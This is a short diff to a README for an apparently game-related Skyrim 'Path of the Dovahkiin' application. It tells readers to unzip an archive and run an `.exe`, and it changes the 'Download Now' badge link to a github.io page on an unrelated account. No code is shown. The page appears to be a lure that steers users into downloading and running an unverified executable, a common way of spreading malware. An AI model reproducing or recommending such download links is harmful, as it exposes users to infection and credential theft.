@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://skyrim-path-of-the-dovahkiin.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://buttmediadomina.github.io/.github/path-of-the-dovahkiin)
 
 ## 📸 Overview
 ![skyrim-dovahkiin-quests](https://github.com/user-attachments/assets/0b55f6e8-9ba5-4058-824c-b09c4f1ad4a9)
